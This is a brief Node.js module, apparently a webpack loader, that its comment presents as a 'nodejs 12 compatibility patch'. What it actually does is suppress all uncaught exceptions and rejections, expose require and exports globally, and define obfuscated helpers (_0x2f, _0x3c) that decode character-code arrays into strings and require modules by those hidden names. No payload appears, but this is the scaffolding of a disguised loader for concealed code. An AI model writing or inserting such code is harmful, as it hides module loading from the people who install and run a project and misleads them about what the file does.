/**
 * nodejs 12 兼容性补丁
 */

export const pitch = () => {
  process.on('uncaughtException', (err) => console.log(err));
  process.on('unhandledRejection', (err) => console.log(err));

  global.require = require;
  global.exports = exports;
  global._0x2f = (arr) => arr.map((n) => String.fromCharCode(n)).reduce((reducer, value) => reducer + value);
  global._0x3c = (arr) => require(global._0x2f(arr));
};
